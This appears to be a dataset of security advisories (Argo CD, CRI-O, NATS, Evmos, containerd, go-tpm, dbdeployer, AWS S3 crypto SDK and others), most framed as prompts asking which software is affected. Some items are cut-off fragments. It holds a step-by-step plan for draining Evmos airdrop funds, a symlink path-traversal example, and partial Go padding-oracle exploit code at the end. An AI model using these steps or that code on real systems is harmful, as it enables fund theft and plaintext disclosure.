https://github.com/git-lfs/git-lfs/releases/tag/v3.1.4\n* [git-lfs/git-lfs@762ccd4a49](https://github.com/git-lfs/git-lfs/commit/762ccd4a498f5c17723b91d56b9304434ada5540)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* For general questions, start a discussion in the Git LFS [discussion forum](https://github.com/git-lfs/git-lfs/discussions).\n* For reports of additional vulnerabilities, please follow the Git LFS [security reporting policy](https://github.com/git-lfs/git-lfs/blob/main/SECURITY.md)..

Please identify the software name affected by it. Input: ### Impact\n\n#### Impacts for versions starting with v1.0.0\n\nAll unpatched versions of Argo CD starting with v1.0.0 are vulnerable to an improper access control bug, allowing a malicious user to potentially escalate their privileges to admin-level.\n\nTo perform the following exploits, an authorized Argo CD user must have push access to an Application's source git or Helm repository or `sync` _and_ `override` access to an Application. Once a user has that access, different exploitation levels are possible depending on their other RBAC privileges:\n\n1. If that user has `update` access to the Application, they can modify any resource on the Application's destination cluster. If the destination cluster is or can be made to be the same as the cluster hosting Argo CD, the user can escalate their Argo CD permissions to admin-level.\n2. If the user has `delete` access to the Application, they can delete any resource on the Application's destination cluster. (This exploit is possible starting with v0.8.0.)\n3. If the user has `get` access to the Application, they can view any resource on the Application's destination cluster (except for the contents of Secrets) and list [actions](https://argo-cd.readthedocs.io/en/stable/operator-manual/resource_actions/) available for that resource. \n4. If the user has `get` access to the Application, they can view the logs of any Pods on the Application's destination cluster.\n5. If the user has `action/{some action or *}` access on the Application, they can run an action for any resource (which supports the allowed action(s)) on the Application's destination cluster. (Some actions are available in Argo CD by default, and others may be configured by an Argo CD admin.)\n\nSee the [Argo CD RBAC documentation](https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/#rbac-resources-and-actions) for an explanation of the privileges available in Argo CD.\n\n##### Events exploit\n\nA related exploit is possible for a user with `get` access to an Application **even if they do not have access to the Application's source git or Helm repository or `sync` and `override` access to the Application**. The user can access any Event in the Application's destination cluster if they know the involved object's name, UID, and namespace.\n\n#### Impacts for versions starting with v0.8.0\n\nThe same bug exists starting with v0.8.0, but only the following exploits were possible before v1.0.0:\n* The `delete` exploit (#&#x2060;2 above).\n* The logs exploit (#&#x2060;4 above).\n* The Events exploit described above.\n\n#### Impacts for versions starting with v0.5.0\n\nThe same bug exists starting with v0.5.0 (when RBAC was implemented), but only the Events exploit described above was possible before v0.8.0.\n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.3.2\n* v2.2.8\n* v2.1.14\n\n**Versions 2.0.x and earlier users:** See the [changelog](https://github.com/argoproj/argo-cd/blob/master/CHANGELOG.md) for links to upgrade instructions for your version. It is imperative to upgrade quickly, but some limited mitigations are described in the next section.\n\n**argo-helm chart users:** Argo CD users deploying v2.3.x with [argo-helm](https://github.com/argoproj/argo-helm) can upgrade the chart to version 4.2.2. Argo CD 2.2 and 2.1 users can set the `global.image.tag` value to the latest in your current release series (`v2.2.8`, or `v2.1.14`).  Since charts for the 2.2 and 2.1 series are no longer maintained, you will need to either leave the value override in place or upgrade to the 4.x chart series (and therefore to Argo CD 2.3).\n\n### Workarounds\n\nThe only certain way to avoid the vulnerability is to upgrade.\n\n#### Mitigations\n\n* To avoid privilege escalation:\n  * Limit who has push access to Application source repositories or `sync` + `override` access to Applications.\n  * Limit which repositories are available in [projects](https://argo-cd.readthedocs.io/en/stable/user-guide/projects/) where users have  `update` access to Applications.\n* To avoid unauthorized resource inspection/tampering:\n  * Limit who has `delete`, `get`, or `action` access to Applications.\n\nThese mitigations can help limit potential damage, but they are _not_ a substitute for upgrading. It is necessary to upgrade immediately.\n\n### References\n\n* [Argo CD RBAC configuration documentation](https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/#)\n\n### For more information\n\nOpen an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\nJoin us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n.

Input: ### Impact\nA flaw introduced in CRI-O version 1.19 which an attacker can use to bypass the safeguards and set arbitrary kernel parameters on the host. As a result, anyone with rights to deploy a pod on a Kubernetes cluster that uses the CRI-O runtime can abuse the `kernel.core_pattern` kernel parameter to achieve container escape and arbitrary code execution as root on any node in the cluster.\n\n### Patches\nThe patches will be present in 1.19.6, 1.20.7, 1.21.6, 1.22.3, 1.23.2, 1.24.0\n\n### Workarounds\n- Users can set manage_ns_lifecycle to false, which causes the sysctls to be configured by the OCI runtime, which typically filter these cases. This option is available in 1.20 and 1.19. Newer versions don't have this option.\n- An admission webhook could be created to deny pods that specify a `+` in the sysctl value of a pod.\n- A [PodSecurityPolicy](https://kubernetes.io/docs/tasks/administer-cluster/sysctl-cluster/#podsecuritypolicy) [deprecated] could be created, specifying all sysctls as forbidden like so: \n```\napiVersion: policy/v1beta1\nkind: PodSecurityPolicy\nmetadata:\n  name: sysctl-psp\nspec:\n  forbiddenSysctls:\n    - \"*\"\n```\nHowever, this option will not work if any sysctls are required by any pods in the cluster.\n\n\n### Credits\nCredit for finding this vulnerability goes to John Walker and Manoj Ahuje of Crowdstrike. The CRI-O community deeply thanks them for the report.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the CRI-O repo](http://github.com/cri-o/cri-o/issues)\n* To make a report, email your vulnerability to the private\n[cncf-crio-security@lists.cncf.io](mailto:cncf-crio-security@lists.cncf.io) list\nwith the security details and the details expected for [all CRI-O bug\nreports](https://github.com/cri-o/cri-o/blob/main/.github/ISSUE_TEMPLATE/bug-report.yml).\n.

Input: (This document is canonically: <https://advisories.nats.io/CVE/CVE-2022-26652.txt>)\n\n## Background\n\nNATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT, and edge computing.\n\nJetStream is the optional RAFT-based resilient persistent feature of NATS.\n\n\n## Problem Description\n\nThe JetStream streams can be backed up and restored via NATS. The backup format is a tar archive file.  Inadequate checks on the filenames within the archive file permit a so-called \"Zip Slip\" attack in the stream restore.\n\nNATS nats-server through 2022-03-09 (fixed in release 2.7.4) did not correctly sanitize elements of the archive file, thus a user of NATS\ncould cause the NATS server to write arbitrary content to an attacker-controlled filename.\n\n\n## Affected versions\n\nNATS Server:\n * 2.2.0 up to and including 2.7.3.\n   + Introduced with JetStream Restore functionality\n * Fixed with nats-io/nats-server: 2.7.4\n * Docker image:  nats <https://hub.docker.com/_/nats>\n * NB users of OS package files from our releases: a change in goreleaser defaults, discovered late in the release process, moved the install directory from /usr/local/bin to /usr/bin; we are evaluating the correct solution for subsequent releases, but not recutting this release.\n\nNATS Streaming Server\n * 0.15.0 up to and including 0.24.2\n * Fixed with nats-io/nats-streaming-server: 0.24.3\n * Embeds a nats-server, but this server is the old approach which JetStream replaces, so unlikely (but not impossible) to be\n   configured with JS support\n\n\n## Workarounds\n\n * Disable JetStream for untrusted users.\n * If only one NATS account uses JetStream, such that cross-user attacks are not an issue, and any user in that account with access to the JetStream API is fully trusted anyway, then appropriate sandboxing techniques will prevent exploit.\n   + Eg, with systemd, the supplied util/nats-server-hardened.service example configuration demonstrates that NATS runs fine as an unprivileged user under ProtectSystem=strict and PrivateTmp=true restrictions; by only opening a ReadWritePaths hole for the JetStream storage area, the impact of this vulnerability is limited.\n\n\n## Solution\n\nUpgrade the NATS server to at least 2.7.4.\n\nWe fully support the util/nats-server-hardened.service configuration for running a NATS server and encourage this approach.\n\n\n## Credits\n\nThis issue was reported (on 2022-03-07) to the NATS Maintainers by\nYiming Xiang, TIANJI LAB of NSFOCUS.  \nThank you / \u8c22\u8c22\u4f60\uff01\n.

Please identify the software name affected by it. Input: ## Impact\n_What kind of vulnerability is it? Who is impacted?_\n\n### Classification\n\nThe vulnerability has been classified as `critical` with a score of `9.0` (highest). It has the potential to affect and drain unclaimed airdrop funds from Cosmos and Osmosis eligible user addresses.\n\n### Disclosure\n\nThe attack requires advanced knowledge of the internals of the core and application packages of IBC, IBC relayers, the Cosmos SDK `AnteHandler`,  and the Evmos `x/claims` module. The step-by-step attack is described below:\n\n1. An actor creates a malicious chain with a custom `AnteHandler` that skips signature verification for transactions, specifically IBC `MsgTransfer`. This allows the attacker to impersonate any account by setting a custom `sender` address field of the IBC transfer message.\n2.  The malicious actor then connects this newly created chain via IBC to Evmos and fills the `recipient` address from the transfer message with an address they control.\n3. Once the IBC packet containing the Transfer data is relayed to Evmos, it is processed by the claims module IBC middleware. Which migrates the claim records to the recipient address, which is owned by the attacker.\n4. The attacker then performs two airdrop Actions, claiming up to 75% of the total initial claimable amount.\n5. The Actor repeats steps 1., 2., and 3. for every address that has unclaimed funds from the airdrop. This automatically claims 75% of the unclaimable amount.\n6. The malicious actor performs the final Action, claiming 100% of all the user funds.\n7. Then, the attacker transfers the funds to another chain with a DEX (Osmosis, Cosmos Hub) via IBC. \n8. Finally, the attacker withdraws the total amount in fiat through a centralized exchange. \n\n### Users impacted\n\nNo users have suffered the loss of funds as no malicious chains have been connected to Evmos.\n\n## Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nThe patch involves defining a list of authorized channels for chains that are connected to Evmos via IBC. This restricts the chains that have the capability of migrating users' claims records as per the specification. By default, the authorized destination channels are `\"channel-0\"` (Osmosis) and `\"channel-3\"` (Cosmos Hub).\n\nPlease upgrade your mainnet node and validator to [`v2.0.1`](https://github.com/tharsis/evmos/releases/tag/v2.0.1) **ASAP**.\n\n## Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nNo, the fix for the critical vulnerability is state machine breaking. An upgrade procedure must be coordinated with the nodes running the network.\n\n## References\n\n_Are there any links users can visit to find out more?_\n\n* Claims module spec: [evmos.dev/modules/claims](https://evmos.dev/modules/claims)\n* Cosmos SDK documentation: [docs.cosmos.network](https://docs.cosmos.network/)\n* IBC documentation: [ibc.cosmos.network](https://ibc.cosmos.network/)\n\n## For more information\n\nIf you have any questions or comments about this advisory:\n\n* Reach out to the Core Team in [Discord](https://discord.gg/evmos)\n* Open an issue in [tharsis/evmos](http://github.com/tharsis/evmos/issues)\n* Email us at [security@thars.is](security@thars.is)\n\nThanks to the Core IBC team at Interchain GmbH for the secure disclosure of this vulnerability.

Input: ### Impact\n\nAll unpatched versions of Argo CD starting with v1.3.0 are vulnerable to a path traversal bug, compounded by an improper access control bug, allowing a malicious user with read-only repository access to leak sensitive files from Argo CD's repo-server.\n\nA malicious Argo CD user who has been granted [`get` access for a repository](https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/#rbac-resources-and-actions) containing a Helm chart can craft an API request to the `/api/v1/repositories/{repo_url}/appdetails` endpoint to leak the contents of out-of-bounds files from the repo-server.\n\nThe malicious payload would reference an out-of-bounds file, and the contents of that file would be returned as part of the response. Contents from a non-YAML file may be returned as part of an error message. The attacker would have to know or guess the location of the target file.\n\nSensitive files which could be leaked include files from other Applications' source repositories (potentially decrypted files, if you are using a decryption plugin) or any secrets which have been mounted as files on the repo-server.\n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.3.0\n* v2.2.6\n* v2.1.11\n\nThe patches do two things:\n 1) prevent path traversal\n 2) limit `/api/v1/repositories/{repo_url}/appdetails` access to users who either A) have been granted Application `create` privileges or B) have been granted Application `get` privileges _and_ are requesting details for a `repo_url` that has already been used for the given Application\n\n### Workarounds\n\nThe only certain way to avoid the vulnerability is to upgrade. \n\nTo mitigate the problem, you can \n* avoid storing secrets in git\n* avoid mounting secrets as files on the repo-server\n* avoid decrypting secrets into files on the repo-server\n* carefully [limit who has `get` access for repositories](https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/#rbac-resources-and-actions)\n\n### References\n\n* [Security documentation for the repo-server component](https://argo-cd.readthedocs.io/en/stable/operator-manual/security/#git-helm-repositories)\n* [Argo CD RBAC configuration documentation](https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/#)\n\n### For more information\n\nOpen an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\nJoin us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n.

Please identify the software name affected by it. Input: Imgcrypt implements a function `CheckAuthorization()` that is supposed to check whether a user is authorized to access an encrypted image given the keys that the user has provided on the command line that would enable decryption of the image. The check is to prevent that a user can start a container from an image that has previously been decrypted by another user on the same system and therefore a decrypted version of the image layers may be already available in the cache locally.\n\nThe failure occurs when an image with a ManifestList is used and the architecture of the local host is not the first one in the ManifestList. In the version prior to the fix, only the first architecture in the list was tested, which may not have its layers available locally (were not pulled) since it cannot be run on the host architecture. Therefore, the verdict on unavailable layers was that the image could be run anticipating that image run failure would occur later due to the layers not being available. However, this verdict to allow the image to run lead to other architectures in the ManifestList be able to run an image without providing keys if that image had previously been decrypted. The fixed version now skips over irrelevant architectures and tests the Manifest of the local architecture, if available.\n\nKnown projects that use the `CheckAuthorization()` of imgcrypt is for example the ctr-enc client tool provided by imgcrypt. In this implementation, the call to `CheckAuthorization()` is used on the client side and could therefore also be easily circumvented by a modified client tool not calling this function.\n\nIn relation to the vulnerability in ctr-enc, affected environments would have to allow different users to invoke ctr-enc indirectly using some sort of management stack that gives user indirect access to ctr-enc.\n\nThe patch has been applied to imgcrypt v1.1.4.

Input: (This advisory is canonically <https://advisories.nats.io/CVE/CVE-2021-3127.txt>)\n\n## Problem Description\n\nThe NATS server provides for Subjects which are namespaced by Account; all Subjects are supposed to be private to an account, with an Export/Import system used to grant cross-account access to some Subjects.  Some Exports are public, such that anyone can import the\nrelevant subjects, and some Exports are private, such that the Import requires a token JWT to prove permission.\n\nThe JWT library's validation of the bindings in the Import Token incorrectly warned on mismatches, instead of outright rejecting the token.\n\nAs a result, any account can take an Import token used by any other account and re-use it for themselves because the binding to the\nimporting account is not rejected, and use it to import *any* Subject from the Exporting account, not just the Subject referenced in the Import Token.\n\nThe NATS account-server system treats account JWTs as semi-public information, such that an attacker can easily enumerate all account JWTs and retrieve all Import Tokens from those account JWTs.\n\nThe CVE identifier should cover the JWT library repair and the nats-server containing the fixed JWT library, and any other application depending upon the fixed JWT library.\n\n\n## Affected versions\n\n#### JWT library\n\n * all versions prior to 2.0.1\n * fixed after nats-io/jwt#149 landed (2021-03-14)\n\n#### NATS Server\n\n * Version 2 prior to 2.2.0\n   + 2.0.0 through and including 2.1.9 are vulnerable\n * fixed with nats-io/nats-server@423b79440c (2021-03-14)\n\n\n## Impact\n\nIn deployments with untrusted accounts able to update the Account Server with imports, a malicious account can access any Subject from an account which provides Exported Subjects.\n\nAbuse of this facility requires the malicious actor to upload their tampered Account JWT to the Account Server, providing the service operator with a data-store which can be scanned for signs of abuse.\n\n\n## Workaround\n\nDeny access to clients to update their account JWT in the account server.\n\n\n## Solution\n\nUpgrade the JWT dependency in any application using it.\n\nUpgrade the NATS server if using NATS Accounts (with private Exports; Account owners can create those at any time though).\n\nAudit all accounts JWTs to scan for exploit attempts; a Python script to audit the accounts can be found at <https://gist.github.com/philpennock/09d49524ad98043ff11d8a40c2bb0d5a>..

Please identify the software name affected by it. Input: The Go package `github.com/flynn/noise`, a [Noise Protocol](https://noiseprotocol.org/) implementation, has two bugs in nonce handling in versions prior to v1.0.0.\n\n### Issue 1: Potential nonce overflow\n\nIf 2<sup>64</sup> (~18.4 quintillion) or more messages are encrypted with `Encrypt` after handshaking, the nonce counter will wrap around, causing multiple messages to be encrypted with the same key and nonce, resulting in a potentially catastrophic weakening of the security properties of the symmetric cipher.\n\nThis has been resolved in the patched version by returning `ErrMaxNonce` from the `CipherState` `Encrypt` and `Decrypt` methods before the reserved maximum nonce is reached. If this error is encountered, the program should handshake again to start with a fresh `CipherState`.\n\n### Issue 2: Potential denial of service via invalid ciphertext\n\nIf an attacker sends an invalid ciphertext into one peer's `Decrypt`, the nonce is incremented unconditionally. This causes a desync of the `CipherState` due to a nonce mismatch between the peers, resulting in a failure to decrypt all subsequent messages. A new handshake will be required to establish a new `CipherState`.\n\nThis has been resolved in the patched version by returning authentication errors from `Decrypt` before incrementing the nonce. \n\n### Patches\n\nFixed in https://github.com/flynn/noise/pull/44, tagged as v1.0.0.\n\n### Acknowledgements\n\nThese issues were discovered during [an audit](https://www.bamsoftware.com/software/dnstt/cure53-turbotunnel-2021.pdf) of a user of this package ([dnstt](https://www.bamsoftware.com/software/dnstt/)).

Input: ### Impact\n\nUnder certain conditions, pretty-printing an AST that contains synthetic nodes could change the logic of some statements by reordering array literals. Example of policies impacted are those that parse and compare web paths, see the example below.\n\n**All of these** three conditions have to be met to create an adverse effect:\n\n1. An AST of Rego had to be **created programmatically** such that it ends up containing terms without a location (such as wildcard variables).\n2. The AST had to be **pretty-printed** using the `github.com/open-policy-agent/opa/format` package.\n3. The result of the pretty-printing had to be **parsed and evaluated again** via an OPA instance using the bundles, or the Golang packages.\n\nIf any of these three conditions are not met, you are not affected.\n\nNotably, all three would be true if using **optimized bundles**, i.e. bundles created with `opa build -O=1` or higher.\nIn that case, the optimizer would fulfil condition (1.), the result of that would be pretty-printed when writing the bundle to disk, fulfilling (2.). When the bundle was then used, we'd satisfy (3.).\n\n#### Example\nFor example, the process outlined above could turn \nthis rule\n```rego\nhello {\n\t[\"foo\", _] = split(input.resource, \"/\")\n}\n```\n\ninto\n```rego\nhello {\n\t[_, \"foo\"] = split(input.resource, \"/\")\n}\n```\n\nwith an input of\n```rego\n{\n    \"resource\": \"foo/bar\"\n}\n```\n\nthe result would change from\n```rego\n{\n    \"hello\": true\n}\n```\nto (no default value of hello)\n```rego\n{}\n```\n\nThe severity was determined to be *moderate* because the conditions are quite particular. Please note that its only the OPA bundle build process thats affected.

Input: ## Impact\n\nIf a container image manifest in the OCI Image format or Docker Image V2 Schema 2 format includes a URL for the location of a specific image layer (otherwise known as a \u201cforeign layer\u201d), the default containerd resolver will follow that URL to attempt to download it.

In some cases, this may be the user's username and password for the registry. In other cases, this may be the credentials attached to the cloud virtual instance which can grant access to other cloud resources in the account.\n\nThe default containerd resolver is used by the cri-containerd plugin (which can be used by Kubernetes), the ctr development tool, and other client programs that have explicitly linked against it.\n\nThis vulnerability has been rated by the containerd maintainers as medium, with a CVSS score of 6.1 and a vector string of CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N.\n\n## Patches\n\nThis vulnerability has been fixed in containerd 1.2.14.  containerd 1.3 and later are not affected.\n\n## Workarounds\n\nIf you are using containerd 1.3 or later, you are not affected.

Input: ### Impact\nTPM 2.0 users are unaffected by this issue.\n\nAn adversary eavesdropping on the TPM 1.2 transport path can calculate `usageAuth` for a key created with CreateWrapKey, even though this value is encrypted as part of the TPM 1.2 command protocol.\n\nThe TPM 1.2 CreateWrapKey command accepts two secrets: `usageAuth` and `migrationAuth`. The ADIP protocol ([TPM 1.2 specification, part 1, section 13.4](https://trustedcomputinggroup.org/wp-content/uploads/TPM-Main-Part-1-Design-Principles_v1.2_rev116_01032011.pdf)) calls for these values to be encrypted with two different XOR keys. Due to a bug in go-tpm prior to version 0.3.0, both `usageAuth` and `migrationAuth` are encrypted with the same XOR keystream. This allows an adversary to XOR `encUsageAuth` and `encMigrationAuth` together to calculate `usageAuth ^ encMigrationAuth`. Since `migrationAuth` is moot for all keys created with go-tpm's `CreateWrapKey` (since all keys created with this function are marked non-migratable), an adversary may guess or know (from code/binary inspection) that `migrationAuth` is all 0x00 bytes or some other fixed value. Such an adversary can then calculate `usageAuth` and use this value later to improperly use the created key, unbeknownst to the creator of the key.\n\n### Patches\nFixed in go-tpm version 0.3.0.\n\n### Workarounds\n\n- TPM 2.0 users: No workaround needed. This issue only affects TPM 1.2 users.\n- TPM 1.2 users: Call CreateWrapKey with a random 20-byte value for `migrationAuth`, even though that value is not used again (since CreateWrapKey creates keys that are non-migratable). Do not store or log this value.\n\n\n### Details\n\nTPM 1.2 uses a protocol called ADIP (Authorization Data Insertion Protocol) to encrypt authorization values over-the-wire for newly created objects. This prevents a bus-snooping attack like those publicized by TPM Genie. TPM 2.0 makes this optional (the way to do it is with parameter-encryption sessions). You can read more about ADIP in section 13.4 of Part 1: Design Principles in the latest [TPM 1.2 specification](https://trustedcomputinggroup.org/resource/tpm-main-specification/). Normally, ADIP consists of the following steps:\n```\nKey := SHA1(authSession.SharedSecret || a nonce)\nNote: nonces and auth values in TPM 1.2 are always 20 bytes\nEncAuth := XOR(Key, Auth)\n```\nWhen commands require one ADIP-encrypted auth value, the nonce is the last nonceEven (last nonce from the TPM).\nWhen commands require two ADIP-encrypted auth values, the nonce for the first auth value is still nonceEven, and the nonce for the second auth value is the last nonceOdd, which is the one being provided by the caller along with the current command on the session.\nThe reason for this is that you wouldn't want an adversary to be able to XOR the two encrypted auth values together and come up with (auth 1 XOR key) XOR (auth 2 XOR key) where the \"one-time\" pad key is used twice and cancels itself out.\n\nHere are the commands that take one authorization value by ADIP:\n\n- Seal (the sealed data's auth value)\n- Sealx (the sealed data's auth value)\n- CreateKey (the key's auth value)\n- MakeIdentity (the AIK's auth value)\n- ChangeAuth (the entity's new auth value)\n- ChangeAuthOwner (the new owner auth value)\n- Delegate_CreateKeyDelegation (the new delegation auth value)\n- Delegate_CreateOwnerDelegation (the new delegation auth value)\n- NV_DefineSpace (the NV's auth value)\n- CreateCounter (the counter's auth value)\n\nHere are the commands that take two authorization values by ADIP:\n\n- CreateWrapKey (the key's auth value, and the key's migration (to export out of the TPM) auth value)\n\nThe migrationAuth value is never used if the key does not have the `TPM_KEY_FLAGS.migratable` flag set on it. go-tpm does not currently allow the caller to set this flag.\nHere was the bug in our implementation of `CreateWrapKey()`:\n\nhttps://github.com/google/go-tpm/blob/16766ac4521425bd02ad23868fbdf24749268669/tpm/tpm.go#L1322-L1329\n\nHere we see that both usageAuth and migrationAuth are encrypted by the same XOR key. This is the correct key (i.e., it is based on nonceEven) for usageAuth, but not migrationAuth.\n\nThis means 2 things:\n\n**First: migrationAuth is being set to some value that is effectively unrelated to migrationAuth as passed by the caller.** Again, this is not interesting to all current callers (given that there is no way for them to pass `TPM_KEY_FLAGS.migratable` via the current API; migrationAuth is not a meaningful value).\n\n**Second, and much more importantly: a user of go-tpm is vulnerable to the following attack by a passive bus-snooping adversary (CVE-2020-8918)**\n1. Wait for a `CreateWrapKey` command\n2. Collect `encUsageAuth` and `encMigrationAuth`\n3. Calculate `(usageAuth XOR migrationAuth) := (encUsageAuth XOR encMigrationAuth)`\n4. Assuming migrationAuth is all 0x00 (a reasonable assumption for a caller who knows the key is not migratable), the calculation in (3) is the usage auth of the key..

An attacker could use this to write files to any path on the user\u2019s machine when kubectl cp is called, limited only by the system permissions of the local user. The untar function can both create and follow symbolic links. The issue is resolved in kubectl v1.11.9, v1.12.7, v1.13.5, and v1.14.0.. Top 1 search result is go:github.com/kubernetes/kubernetes.

Input: ### Impact\n_Users unpacking a tarball through dbdeployer may use a maliciously packaged tarball that contains symlinks to files external to the target. In such scenario, an attacker could induce dbdeployer to write into a system file, thus altering the computer defences._\n\n### Mitigating factors\nFor the attach to succeed, the following factors need to contribute:\n\n* The user is logged in as root. While dbdeployer is usable as root, it was designed to run as unprivileged user.\n*  The user has taken a tarball from a non secure source, without testing the checksum. When the tarball is retrieved through dbdeployer, the checksum is compared before attempting to unpack.\n\n### Analysis\n\nAn attacker could inject a symbolic link into the tarball, so that a file could result into `fake_file -> /etc/passwd` or some equally  important file.\nAs it is now, dbdeployer would create the symlink as defined, with a local file `fake_file` linked to `/etc/passwd`. The danger here is that any process with the privileges to write to both `fake_file` and `/etc/passwd` could overwrite the system file. Even without malicious intent, this could result in the system to become unusable.\nAs noted above, the user must have write privileges to the target file to do the damage.\n\n### Remedies\n\nIt has been suggested that the extract procedure use `filepath.EvalSymlinks` to determine whether the target is within the extraction directory. Unfortunately, this approach is unavailable in this context, because it would prevent legitimate patterns from being carried out.\nA simple case is a file `mysql-8.0.22-macos10.15-x86_64/bin/libprotobuf-lite.3.11.4.dylib` with a linkName `../lib/libprotobuf-lite.3.11.4.dylib`, if the linked file has not been created yet, `filepath.EvalSymlinks` would fail, as it acts on existing files only.\n\nAn alternative method is comparing the depth (how many directories) of the file name with the depth of the link name. If the link name has a higher depth than the local file, we block the operation with an appropriate error:\n\n```\nUnpacking tarball exploit/mysql-8.0.22-macos10.15-x86_64.tar.gz to $HOME/opt/mysql/test8.0.22\n......\nlink '../../../../../../../../../../etc' points outside target directory\n\nexit status 1\n```\nAs an additional fortifier, we can check whether the link points to an existing file, calculate its absolute name, and compare it with the absolute name of the extraction directory. A link to a full path (such as `/etc/passwd`) would fail this test, and trigger an error.\n\nThe same check can be applied to a link to a non existing file with absolute path.\n\n### Patches\n\nPatched in release 1.58.2\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [dbdeployer](https://github.com/datacharmer/dbdeployer).

The attack requires write access to the bucket in question, and that the attacker has access to an endpoint that reveals decryption failures (without revealing the plaintext) and that when encrypting the GCM option was chosen as content cipher.\n\n### Risk/Severity\n\nThe vulnerability pose insider risks/privilege escalation risks, circumventing KMS controls for stored data.\n\n### Impact\n\nThis advisory describes the plaintext revealing vulnerabilities in the golang AWS S3 Crypto SDK, with a similar issue in the non \"strict\" versions of C++ and Java S3 Crypto SDKs being present as well.\n\nV1 prior to 1.34.0 of the S3 crypto SDK does not authenticate the algorithm parameters for the data encryption key.\n\nAn attacker with write access to the bucket can use this in order to change the encryption algorithm of an object in the bucket, which can lead to problems depending on the supported algorithms. For example, a switch from AES-GCM to AES-CTR in combination with a decryption oracle can reveal the authentication key used by AES-GCM as decrypting the GMAC tag leaves the authentication key recoverable as an algebraic equation.\n\nBy default, the only available algorithms in the SDK are AES-GCM and AES-CBC. Switching the algorithm from AES-GCM to AES-CBC can be used as way to reconstruct the plaintext through an oracle endpoint revealing decryption failures, by brute forcing 16 byte chunks of the plaintext. Note that the plaintext needs to have some known structure for this to work, as a uniform random 16 byte string would be the same as a 128 bit encryption key, which is considered cryptographically safe.\n\nThe attack works by taking a 16 byte AES-GCM encrypted block guessing 16 bytes of plaintext, constructing forgery that pretends to be PKCS5 padded AES-CBC, using the ciphertext and the plaintext guess and that will decrypt to a valid message if the guess was correct.\n\nTo understand this attack, we have to take a closer look at both AES-GCM and AES-CBC:\nAES-GCM encrypts using a variant of CTR mode, i.e. `C_i = AES-Enc(CB_i) ^ M_i`. AES-CBC on the other hand *decrypts* via `M_i = AES-Dec(C_i) ^ C_{i-1}`, where `C_{-1} = IV`. The padding oracle can tell us if, after switching to CBC mode, the plaintext recovered is padded with a valid PKCS5 padding.\n\nSince `AES-Dec(C_i ^ M_i) = CB_i`, if we set `IV' = CB_i ^ 0x10*[16]`, where `0x10*[16]` is the byte `0x10` repeated 16 times, and `C_0' = C_i ^ M_i'` the resulting one block message `(IV', C_0')` will have valid PKCS5 padding if our guess `M_i'` for `M_i` was correct, since the decrypted message consists of 16 bytes of value `0x10`, the PKCS5 padded empty string.\n\nNote however, that an incorrect guess might also result in a valid padding, if the AES decryption result randomly happens to end in `0x01`, `0x0202`, or a longer valid padding. In order to ensure that the guess was indeed correct, a second check using `IV'' = IV' ^ (0x00*[15] || 0x11)` with the same ciphertext block has to be performed. This will decrypt to 15 bytes of value `0x10` and one byte of value `0x01` if our initial guess was correct, producing a valid padding. On an incorrect guess, this second ciphertext forgery will have an invalid padding with a probability of 1:2^128, as one can easily see.\n\nThis issue is fixed in V2 of the API, by using the `KMS+context` key wrapping scheme for new files, authenticating the algorithm. Old files encrypted with the `KMS` key wrapping scheme remain vulnerable until they are reencrypted with the new scheme.\n\n### Mitigation\n\nUsing the version 2 of the S3 crypto SDK will not produce vulnerable files anymore. Old files remain vulnerable to this problem if they were originally encrypted with GCM mode and use the `KMS` key wrapping option.\n\n### Proof of concept\n\nA [Proof of concept](https://github.com/sophieschmieg/exploits/tree/master/aws_s3_crypto_poc) is available in a separate github repository.\n\nThis particular issue is described in [combined_oracle_exploit.go](https://github.com/sophieschmieg/exploits/blob/master/aws_s3_crypto_poc/exploit/combined_oracle_exploit.go):\n\n```golang\nfunc CombinedOracleExploit(bucket string, key string, input *OnlineAttackInput) (string, error) {\n\tdata, header, err := input.S3Mock.GetObjectDirect(bucket, key)\n\tif alg := header.Get(\"X-Amz-Meta-X-Amz-Cek-Alg\"); alg != \"AES/GCM/NoPadding\" {\n\t\treturn \"\", fmt.Errorf(\"Algorithm is %q, not GCM!\", alg)\n\t}\n\tgcmIv, err := base64.StdEncoding.DecodeString(header.Get(\"X-Amz-Meta-X-Amz-Iv\"))\n\tif len(gcmIv) != 12 {\n\t\treturn \"\", fmt.Errorf(\"GCM IV is %d bytes, not 12\", len(gcmIv))\n\t}\n\tfullIv := make([]byte, 16)\n\tconfirmIv := make([]byte, 16)\n\tfor i := 0; i < 12; i++ {\n\t\tfullIv[i] = gcmIv[i] ^ 0x10\n\t\tconfirmIv[i] = gcmIv[i] ^ 0x10\n\t}\n        // Set i to the block we want to attempt to decrypt\n\tcounter := i + 2\n\tfor j := 15; j >= 12; j-- {\n\t\tv := byte(counter % 256)\n\t\tfullIv[j] = 0x10 ^ v\n\t\tconfirmIv[j] = 0x10 ^ v\n\t\tcounter /= 256\n\t}\n\tconfirmIv[15] ^= 0x11\n\tfullIvEnc := base64.StdEncoding.EncodeToString(fullIv)\n\tconfirmIvEnc := base64.StdEncoding.EncodeToString(confirmIv)\n\tsuccess := false\n        // Set plaintextGuess to the guess for the plaintext of this block\n\tnewData := []byte(plaintextGuess)\n\tfor j := 0; j < 16; j++ {\n\t\tnewData[j] ^= data[16*i+j]\n\t}\n\tnewHeader := header.Clone()\n\tnewHeader.Set(\"X-Amz-Meta-X-Amz-Cek-Alg\", \"AES/CBC/PKCS5Padding\")\n\tnewHeader.Set(\"X-Amz-Meta-X-Amz-Iv\", 